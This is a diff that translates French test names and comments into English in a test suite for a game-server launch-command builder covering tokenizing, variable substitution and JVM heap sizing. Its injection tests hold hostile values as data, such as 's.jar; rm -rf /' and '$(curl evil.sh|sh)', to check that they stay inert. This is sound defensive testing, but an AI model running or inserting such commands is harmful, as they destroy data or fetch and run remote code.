@@ -17,7 +17,7 @@ const CONTEXT = {
 };
 
 describe('tokenize', () => {
-  it('découpe sur les espaces', () => {
+  it('splits on spaces', () => {
     expect(tokenize('java -Xmx1024M -jar server.jar')).toEqual([
       'java',
       '-Xmx1024M',
@@ -26,94 +26,94 @@ describe('tokenize', () => {
     ]);
   });
 
-  it('respecte les guillemets doubles', () => {
-    expect(tokenize('java -Dname="Mon Serveur" -jar s.jar')).toEqual([
+  it('honours double quotes', () => {
+    expect(tokenize('java -Dname="My Server" -jar s.jar')).toEqual([
       'java',
-      '-Dname=Mon Serveur',
+      '-Dname=My Server',
       '-jar',
       's.jar',
     ]);
   });
 
-  it('respecte les guillemets simples', () => {
+  it('honours single quotes', () => {
     expect(tokenize("java -Dmsg='a b c'")).toEqual(['java', '-Dmsg=a b c']);
   });
 
-  it('ignore les espaces multiples et les tabulations', () => {
+  it('ignores repeated spaces and tabs', () => {
     expect(tokenize('java   -jar\t\ts.jar')).toEqual(['java', '-jar', 's.jar']);
   });
 
-  it('conserve un argument vide explicite', () => {
+  it('keeps an explicitly empty argument', () => {
     expect(tokenize('java -Dx=""')).toEqual(['java', '-Dx=']);
   });
 
-  it('refuse un guillemet non fermé', () => {
-    expect(() => tokenize('java -Dname="oups')).toThrow(InvocationError);
+  it('rejects an unclosed quote', () => {
+    expect(() => tokenize('java -Dname="oops')).toThrow(InvocationError);
   });
 
-  it('retourne un tableau vide pour une chaîne vide', () => {
+  it('returns an empty array for an empty string', () => {
     expect(tokenize('   ')).toEqual([]);
   });
 });
 
 describe('substitute', () => {
-  it('remplace les variables connues', () => {
+  it('replaces known variables', () => {
     expect(substitute('-jar {{SERVER_JARFILE}}', CONTEXT).value).toBe('-jar server.jar');
   });
 
-  it('tolère les espaces dans les accolades', () => {
+  it('tolerates spaces inside the braces', () => {
     expect(substitute('{{ SERVER_PORT }}', CONTEXT).value).toBe('25565');
   });
 
-  it('fournit les variables intégrées', () => {
-    // 4096 Mio de conteneur → 3276 Mio de tas (80 %), le reste étant laissé
-    // au hors-tas de la JVM et au cache de pages.
+  it('provides the built-in variables', () => {
+    // A 4096 MiB container → a 3276 MiB heap (80%), the rest left to the JVM's
+    // off-heap and to the page cache.
     expect(substitute('-Xmx{{SERVER_MEMORY}}M', CONTEXT).value).toBe('-Xmx3276M');
     expect(substitute('{{SERVER_IP}}:{{SERVER_PORT}}', CONTEXT).value).toBe('0.0.0.0:25565');
   });
 
-  it('expose aussi la limite brute du conteneur', () => {
+  it('also exposes the raw container limit', () => {
     expect(substitute('{{SERVER_MEMORY_LIMIT}}', CONTEXT).value).toBe('4096');
   });
 
-  it('accepte la notation pointée des eggs Pterodactyl', () => {
+  it('accepts the dotted notation of Pterodactyl eggs', () => {
     expect(substitute('{{server.build.default.port}}', CONTEXT).value).toBe('25565');
   });
 
-  it('signale une variable inconnue et la remplace par du vide', () => {
-    const result = substitute('{{INCONNUE}}-suffixe', CONTEXT);
-    expect(result.value).toBe('-suffixe');
-    expect(result.missing).toEqual(['INCONNUE']);
+  it('reports an unknown variable and replaces it with nothing', () => {
+    const result = substitute('{{UNKNOWN}}-suffix', CONTEXT);
+    expect(result.value).toBe('-suffix');
+    expect(result.missing).toEqual(['UNKNOWN']);
   });
 
-  // Un template ne doit pas pouvoir rediriger le port d'écoute annoncé aux
-  // joueurs en redéfinissant la variable.
-  it('ne laisse pas le template écraser une variable intégrée', () => {
+  // A template must not be able to redirect the listening port announced to
+  // players by redefining the variable.
+  it('does not let the template overwrite a built-in variable', () => {
     const context = { ...CONTEXT, environment: { SERVER_PORT: '1337' } };
     expect(substitute('{{SERVER_PORT}}', context).value).toBe('25565');
   });
 });
 
 /**
- * Ce bloc existe à cause d'un serveur tué par le noyau sur la machine de test,
- * puis corrigé deux fois — les deux erreurs valent d'être retenues.
+ * This block exists because of a server killed by the kernel on the test
+ * machine, then fixed twice — both mistakes are worth remembering.
  *
- * D'abord, la JVM était lancée avec `-Xmx` égal à la limite du conteneur : le
- * tas pouvait à lui seul remplir le cgroup.
+ * First, the JVM was launched with `-Xmx` equal to the container limit: the
+ * heap alone could fill the cgroup.
  *
- * Ensuite, la marge de 256 Mio couvrait le hors-tas de la JVM mais oubliait le
- * cache de pages, lui aussi compté dans le cgroup. Mesure à l'appui : conteneur
- * de 1024 Mio, `-Xmx768M`, mémoire anonyme montant à 1018 Mio, cache écrasé de
- * 127 Mio à 0, puis code 137 — après un démarrage pourtant complet.
+ * Then, the 256 MiB headroom covered the JVM's off-heap but forgot the page
+ * cache, which counts towards the cgroup too. With measurements: a 1024 MiB
+ * container, `-Xmx768M`, anonymous memory climbing to 1018 MiB, cache crushed
+ * from 127 MiB to 0, then code 137 — after a start that had fully completed.
  */
 describe('heapBudgetMib', () => {
-  // Deux règles se combinent, et la plus stricte l'emporte : une marge fixe de
-  // 384 Mio, et un plafond à 80 %. La bascule se fait à 1920 Mio.
+  // Two rules combine, and the stricter wins: a fixed 384 MiB headroom, and an
+  // 80% ceiling. The switch happens at 1920 MiB.
   it.each([
     [512, 128],
     [1024, 640],
     [1536, 1152],
-  ])('retire la marge fixe sur %s Mio', (limit, expected) => {
+  ])('subtracts the fixed headroom on %s MiB', (limit, expected) => {
     expect(heapBudgetMib(limit)).toBe(expected);
   });
 
@@ -121,44 +121,44 @@ describe('heapBudgetMib', () => {
     [2048, 1638],
     [4096, 3276],
     [8192, 6553],
-  ])('applique le plafond de 80 %% sur %s Mio', (limit, expected) => {
+  ])('applies the 80%% ceiling on %s MiB', (limit, expected) => {
     expect(heapBudgetMib(limit)).toBe(expected);
   });
 
-  // C'est la propriété qui compte, plus que les valeurs exactes : le tas ne
-  // doit jamais pouvoir remplir le conteneur à lui seul.
+  // This is the property that matters, more than the exact values: the heap
+  // must never be able to fill the container on its own.
   it.each([256, 512, 1024, 2048, 4096, 8192, 16384, 65536])(
-    'laisse au moins 20 %% de marge sur %s Mio',
+    'leaves at least 20%% of headroom on %s MiB',
     (limit) => {
       const heap = heapBudgetMib(limit);
       expect(heap).toBeLessThanOrEqual(Math.floor(limit * MAX_HEAP_RATIO));
     },
   );
 
-  // La mesure qui a motivé la correction : à 1024 Mio, le hors-tas anonyme
-  // seul pèse ~250 Mio. Il doit rester de quoi cacher les fichiers de région,
-  // sans quoi le noyau évince tout puis tue le processus.
-  it('laisse de la place au cache de pages sur une petite allocation', () => {
+  // The measurement that motivated the fix: at 1024 MiB, the anonymous off-heap
+  // alone weighs ~250 MiB. Enough has to be left to cache the region files,
+  // failing which the kernel evicts everything then kills the process.
+  it('leaves room for the page cache on a small allocation', () => {
     const NON_HEAP_ANON_MIB = 250;
     const heap = heapBudgetMib(1024);
 
     expect(1024 - heap - NON_HEAP_ANON_MIB).toBeGreaterThanOrEqual(128);
   });
 
-  it('ne descend jamais sous le plancher de démarrage de la JVM', () => {
+  it('never goes below the JVM startup floor', () => {
     expect(heapBudgetMib(128)).toBe(128);
     expect(heapBudgetMib(64)).toBe(128);
   });
 
-  // Sans limite de conteneur, il n'y a rien à répartir : c'est au template de
-  // ne pas utiliser `-Xmx` dans ce cas.
-  it('retourne 0 pour une mémoire illimitée', () => {
+  // With no container limit there is nothing to share out: it is up to the
+  // template not to use `-Xmx` in that case.
+  it('returns 0 for unlimited memory', () => {
     expect(heapBudgetMib(0)).toBe(0);
   });
 });
 
 describe('buildInvocation', () => {
-  it('produit un argv exploitable', () => {
+  it('produces a usable argv', () => {
     const { argv } = buildInvocation(
       'java -Xms128M -Xmx{{SERVER_MEMORY}}M -jar {{SERVER_JARFILE}}',
       CONTEXT,
@@ -168,11 +168,11 @@ describe('buildInvocation', () => {
   });
 
   // ---------------------------------------------------------------------------
-  // Ces cas sont la raison d'être du module : ils échouent si l'ordre
-  // découpage / substitution est inversé un jour.
+  // These cases are the reason the module exists: they fail if the split /
+  // substitute order is ever reversed.
   // ---------------------------------------------------------------------------
 
-  it("empêche une valeur de variable d'introduire un argument", () => {
+  it('stops a variable value from introducing an argument', () => {
     const context = { ...CONTEXT, environment: { SERVER_JARFILE: 'a.jar --hostile-flag' } };
     const { argv } = buildInvocation('java -jar {{SERVER_JARFILE}}', context);
 
@@ -180,14 +180,14 @@ describe('buildInvocation', () => {
     expect(argv).toHaveLength(3);
   });
 
-  it("empêche l'injection d'une commande par point-virgule", () => {
+  it('stops command injection through a semicolon', () => {
     const context = { ...CONTEXT, environment: { SERVER_JARFILE: 's.jar; rm -rf /' } };
     const { argv } = buildInvocation('java -jar {{SERVER_JARFILE}}', context);
 
     expect(argv).toEqual(['java', '-jar', 's.jar; rm -rf /']);
   });
 
-  it("empêche l'injection par substitution de commande", () => {
+  it('stops injection through command substitution', () => {
     const context = { ...CONTEXT, environment: { SERVER_JARFILE: '$(curl evil.sh|sh)' } };
     const { argv } = buildInvocation('java -jar {{SERVER_JARFILE}}', context);
 
@@ -195,7 +195,7 @@ describe('buildInvocation', () => {
     expect(argv).toHaveLength(3);
   });
 
-  it("empêche l'injection par retour à la ligne", () => {
+  it('stops injection through a newline', () => {
     const context = { ...CONTEXT, environment: { SERVER_JARFILE: 's.jar\nrm -rf /' } };
     const { argv } = buildInvocation('java -jar {{SERVER_JARFILE}}', context);
 
@@ -203,7 +203,7 @@ describe('buildInvocation', () => {
     expect(argv[2]).toBe('s.jar\nrm -rf /');
   });
 
-  it('empêche une valeur de fermer un guillemet du gabarit', () => {
+  it('stops a value from closing a quote of the template', () => {
     const context = { ...CONTEXT, environment: { NAME: 'x" --hostile "y' } };
     const { argv } = buildInvocation('java -Dname="{{NAME}}"', context);
 
@@ -212,25 +212,25 @@ describe('buildInvocation', () => {
 
   // ---------------------------------------------------------------------------
 
-  it('retire un argument devenu entièrement vide', () => {
+  it('drops an argument that became entirely empty', () => {
     const context = { ...CONTEXT, environment: {} };
-    const { argv, missingVariables } = buildInvocation('java {{ABSENTE}} -jar s.jar', context);
+    const { argv, missingVariables } = buildInvocation('java {{MISSING}} -jar s.jar', context);
 
     expect(argv).toEqual(['java', '-jar', 's.jar']);
-    expect(missingVariables).toEqual(['ABSENTE']);
+    expect(missingVariables).toEqual(['MISSING']);
   });
 
-  it('refuse un gabarit vide', () => {
-    expect(() => buildInvocation('   ', CONTEXT)).toThrow(/vide/);
+  it('rejects an empty template', () => {
+    expect(() => buildInvocation('   ', CONTEXT)).toThrow(/empty/);
   });
 
-  it("refuse un gabarit dont l'exécutable disparaît après substitution", () => {
-    expect(() => buildInvocation('{{ABSENTE}}', { ...CONTEXT, environment: {} })).toThrow(
-      /aucun exécutable/,
+  it('rejects a template whose executable disappears after substitution', () => {
+    expect(() => buildInvocation('{{MISSING}}', { ...CONTEXT, environment: {} })).toThrow(
+      /no executable/,
     );
   });
 
-  it('remonte chaque variable manquante une seule fois', () => {
+  it('reports each missing variable only once', () => {
     const { missingVariables } = buildInvocation('java {{X}} {{X}} {{Y}} -jar s.jar', {
       ...CONTEXT,
       environment: {},
@@ -241,7 +241,7 @@ describe('buildInvocation', () => {
 });
 
 describe('buildEnvironment', () => {
-  it('expose les variables du template et les variables intégrées', () => {
+  it('exposes the template variables and the built-in ones', () => {
     const env = buildEnvironment(CONTEXT);
 
     expect(env).toContain('SERVER_JARFILE=server.jar');
@@ -250,12 +250,12 @@ describe('buildEnvironment', () => {
     expect(env).toContain('SERVER_PORT=25565');
   });
 
-  it('écarte les noms invalides en POSIX', () => {
+  it('drops names that are invalid in POSIX', () => {
     const env = buildEnvironment(CONTEXT);
     expect(env.some((entry) => entry.startsWith('server.build'))).toBe(false);
   });
 
-  it('ne laisse pas le template redéfinir une variable intégrée', () => {
+  it('does not let the template redefine a built-in variable', () => {
     const env = buildEnvironment({ ...CONTEXT, environment: { SERVER_PORT: '1337' } });
 
     expect(env).toContain('SERVER_PORT=25565');
